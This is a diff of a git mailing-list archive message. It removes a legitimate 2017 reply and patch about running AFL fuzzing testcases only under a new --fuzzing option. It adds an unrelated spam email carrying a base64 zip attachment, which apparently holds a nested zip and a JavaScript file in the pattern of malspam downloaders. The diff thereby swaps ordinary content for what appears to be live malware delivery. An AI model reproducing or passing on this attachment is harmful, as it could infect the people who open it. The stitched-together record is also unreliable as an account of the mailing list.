@@ -1,183 +1,134 @@
 Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on dcvr.yhbt.net
-X-Spam-Level: 
+X-Spam-Level: *
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-3.7 required=3.0 tests=AWL,BAYES_00,
-	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD
-	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.0
+X-Spam-Status: No, score=1.6 required=3.0 tests=BAYES_50,
+	HEADER_FROM_DIFFERENT_DOMAINS,RCVD_IN_DNSWL_HI,RP_MATCHES_RCVD,ZIPFILE
+	shortcircuit=no autolearn=no autolearn_force=no version=3.4.0
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id C01C6202C1
-	for <e@80x24.org>; Sun, 12 Mar 2017 13:45:10 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id 5372C202C1
+	for <e@80x24.org>; Sun, 12 Mar 2017 15:13:54 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1755755AbdCLNpJ (ORCPT <rfc822;e@80x24.org>);
-        Sun, 12 Mar 2017 09:45:09 -0400
-Received: from userp1040.oracle.com ([156.151.31.81]:49522 "EHLO
-        userp1040.oracle.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1755742AbdCLNpI (ORCPT <rfc822;git@vger.kernel.org>);
-        Sun, 12 Mar 2017 09:45:08 -0400
-Received: from aserv0022.oracle.com (aserv0022.oracle.com [141.146.126.234])
-        by userp1040.oracle.com (Sentrion-MTA-4.3.2/Sentrion-MTA-4.3.2) with ESMTP id v2CDivAq015795
-        (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
-        Sun, 12 Mar 2017 13:44:57 GMT
-Received: from userv0122.oracle.com (userv0122.oracle.com [156.151.31.75])
-        by aserv0022.oracle.com (8.14.4/8.14.4) with ESMTP id v2CDiuWj020478
-        (version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
-        Sun, 12 Mar 2017 13:44:56 GMT
-Received: from abhmp0003.oracle.com (abhmp0003.oracle.com [141.146.116.9])
-        by userv0122.oracle.com (8.14.4/8.14.4) with ESMTP id v2CDit2B021196;
-        Sun, 12 Mar 2017 13:44:55 GMT
-Received: from [10.175.254.140] (/10.175.254.140)
-        by default (Oracle Beehive Gateway v4.0)
-        with ESMTP ; Sun, 12 Mar 2017 06:44:55 -0700
-Subject: Re: [RFC][PATCH] index-pack: add testcases found using AFL
-To:     Jeff King <peff@peff.net>,
-        =?UTF-8?B?w4Z2YXIgQXJuZmrDtnLDsCBCamFybWFz?= =?UTF-8?Q?on?= 
-        <avarab@gmail.com>
-References: <20170310151556.18490-1-vegard.nossum@oracle.com>
- <20170310190641.i7geazhrlmzzfna6@sigill.intra.peff.net>
- <CACBZZX5fGU9C-z94KbMAs_AegOSGtq8nbrkRe-NxBCHYsDswkA@mail.gmail.com>
- <20170312123212.3rnqyx3dvi5yppk5@sigill.intra.peff.net>
-Cc:     Junio C Hamano <gitster@pobox.com>,
-        Git Mailing List <git@vger.kernel.org>
-From:   Vegard Nossum <vegard.nossum@oracle.com>
-Message-ID: <8fb54c74-a5a5-eb55-8734-61a3753c05e1@oracle.com>
-Date:   Sun, 12 Mar 2017 14:44:52 +0100
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
- Thunderbird/45.7.0
+        id S1755775AbdCLPNw (ORCPT <rfc822;e@80x24.org>);
+        Sun, 12 Mar 2017 11:13:52 -0400
+Received: from 118-170-232-208.dynamic.hinet.net ([118.170.232.208]:57734 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1755750AbdCLPNu (ORCPT <rfc822;git@vger.kernel.org>);
+        Sun, 12 Mar 2017 11:13:50 -0400
+X-Greylist: delayed 300 seconds by postgrey-1.27 at vger.kernel.org; Sun, 12 Mar 2017 11:13:49 EDT
+Reply-To: <krogers6@wisc.edu>
+Subject: 57144 git
+From:   <krogers6@wisc.edu>
+Content-Type: application/zip; name="82454798713.zip"
 MIME-Version: 1.0
-In-Reply-To: <20170312123212.3rnqyx3dvi5yppk5@sigill.intra.peff.net>
-Content-Type: multipart/mixed;
- boundary="------------F8267D6937767EA4CFFA6045"
-X-Source-IP: aserv0022.oracle.com [141.146.126.234]
+Importance: High
+Content-Transfer-Encoding: base64
+Date:   Sun, 12 Mar 2017 15:13:43 -0000
+Message-ID: <148933162324.30292.9088933319724574798@hinet.net>
+To:     "git" <git@vger.kernel.org>
+Content-Disposition: attachment
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-This is a multi-part message in MIME format.
---------------F8267D6937767EA4CFFA6045
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
-
-On 12/03/2017 13:32, Jeff King wrote:
-> If people really _do_ care about coverage, arguably the AFL tests are a
-> pollution of that concept. Because they are running the code, but doing
-> a very perfunctory job of testing it. IOW, our coverage of "code that
-> doesn't segfault or trigger ASAN" is improved, but our coverage of "code
-> that has been tested to be correct" is not (and since the tests are
-> lumped together, it's hard to get anything but one number).
-
-It wouldn't be hard to separate out the testcases found by fuzzing
-I've attached a patch that does just that -- none of the new testcases
-are run unless you pass -f/--fuzzing in GIT_TEST_OPTS.
-
-$ make -C t GIT_TEST_OPTS="--run=34" t5300-pack-object.sh
-make: Entering directory '/home/vegard/git/git/t'
-*** t5300-pack-object.sh ***
-[...]
-ok 34 # skip index-pack edge coverage (missing FUZZING)
-[...]
-
-$ make -C t GIT_TEST_OPTS="--run=34 -f" t5300-pack-object.sh
-make: Entering directory '/home/vegard/git/git/t'
-*** t5300-pack-object.sh ***
-[...]
-ok 34 - index-pack edge coverage
-[...]
-
-I assume automatic testing like e.g. Travis would want to enable this.
-
-Would that help at all?
-
-
-Vegard
-
---------------F8267D6937767EA4CFFA6045
-Content-Type: text/x-patch;
- name="0001-test-lib-add-fuzzing-option.patch"
-Content-Transfer-Encoding: 7bit
-Content-Disposition: attachment;
- filename="0001-test-lib-add-fuzzing-option.patch"
-
-From 04446ce562eee129588f2c92c4eef2c82ed4bb4f Mon Sep 17 00:00:00 2001
-From: Vegard Nossum <vegard.nossum@oracle.com>
-Date: Sun, 12 Mar 2017 14:35:25 +0100
-Subject: [PATCH] test-lib: add --fuzzing option
-
-From t/README:
-
-	This causes additional testcases found by fuzzing to be run,
-	for more exhaustive testing. Please note that these testcases
-	have not been vetted for correctness, but they may uncover
-	bugs introduced in code paths which are not otherwise run
-	in other tests.
-
-The -f/--fuzzing/FUZZING name is up for discussion, I just couldn't think
-of anything more descriptive.
----
- t/README               | 8 ++++++++
- t/t5300-pack-object.sh | 2 +-
- t/test-lib.sh          | 6 ++++++
- 3 files changed, 15 insertions(+), 1 deletion(-)
-
-diff --git a/t/README b/t/README
-index 4982d1c52..2c56567b1 100644
---- a/t/README
-+++ b/t/README
-@@ -110,6 +110,14 @@ appropriately before running "make".
- 	This causes additional long-running tests to be run (where
- 	available), for more exhaustive testing.
- 
-+-f::
-+--fuzzing::
-+	This causes additional testcases found by fuzzing to be run,
-+	for more exhaustive testing. Please note that these testcases
-+	have not been vetted for correctness, but they may uncover
-+	bugs introduced in code paths which are not otherwise run
-+	in other tests.
-+
- -r::
- --run=<test-selector>::
- 	Run only the subset of tests indicated by
-diff --git a/t/t5300-pack-object.sh b/t/t5300-pack-object.sh
-index 19e02ffc2..f58d0d4bf 100755
---- a/t/t5300-pack-object.sh
-+++ b/t/t5300-pack-object.sh
-@@ -422,7 +422,7 @@ test_expect_success 'index-pack <pack> works in non-repo' '
- '
- 
- # These pack files were generated using AFL
--test_expect_success 'index-pack edge coverage' '
-+test_expect_success FUZZING 'index-pack edge coverage' '
- 	for pack in "$TEST_DIRECTORY"/t5300/*.pack
- 	do
- 		rm -rf "${pack%.pack}.idx" &&
-diff --git a/t/test-lib.sh b/t/test-lib.sh
-index 86d77c16d..35df2bd6c 100644
---- a/t/test-lib.sh
-+++ b/t/test-lib.sh
-@@ -209,6 +209,8 @@ do
- 		immediate=t; shift ;;
- 	-l|--l|--lo|--lon|--long|--long-|--long-t|--long-te|--long-tes|--long-test|--long-tests)
- 		GIT_TEST_LONG=t; export GIT_TEST_LONG; shift ;;
-+	-f|--f|--fuzzing)
-+		GIT_TEST_FUZZING=t; export GIT_TEST_FUZZING; shift ;;
- 	-r)
- 		shift; test "$#" -ne 0 || {
- 			echo 'error: -r requires an argument' >&2;
-@@ -1098,6 +1100,10 @@ test_lazy_prereq EXPENSIVE '
- 	test -n "$GIT_TEST_LONG"
- '
- 
-+test_lazy_prereq FUZZING '
-+	test -n "$GIT_TEST_FUZZING"
-+'
-+
- test_lazy_prereq USR_BIN_TIME '
- 	test -x /usr/bin/time
- '
--- 
-2.12.0.rc0
-
-
---------------F8267D6937767EA4CFFA6045--
+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
+AAAAAQABAFIAAAC0FQAAAAA=
